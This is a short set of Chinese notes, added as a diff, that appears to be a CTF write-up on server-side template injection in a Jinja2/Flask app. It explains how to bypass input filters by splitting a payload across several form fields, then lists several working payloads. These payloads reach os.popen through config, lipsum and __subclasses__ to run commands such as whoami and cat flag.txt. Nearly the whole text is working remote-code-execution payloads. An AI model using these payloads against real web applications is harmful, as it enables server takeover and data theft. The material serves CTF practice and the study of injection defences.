@@ -1,0 +1,17 @@
+1.这里<通关人>没任何过滤，但有长度限制，只能25个字符以内，<排名>和<通关时间>都有严格的校验，<通关感言>有较严格的过滤，包括下划线、单双引号、request、中括号、百分号等一些关键字符
+
+导致只通过其中一个输入框无法getshell，需要多个输入框进行配合getshell
+
+
+/edit?a=__init__&b=__globals__&c=__getitem__&d=os&e=popen&f=whoami&g=read
+POST:
+name={%25set r=request.args%25}&rank=1&speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&time=2021年11月11日
+
+2.目前遇到最短payload
+{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
+
+3.
+{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
+
+4.
+{{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
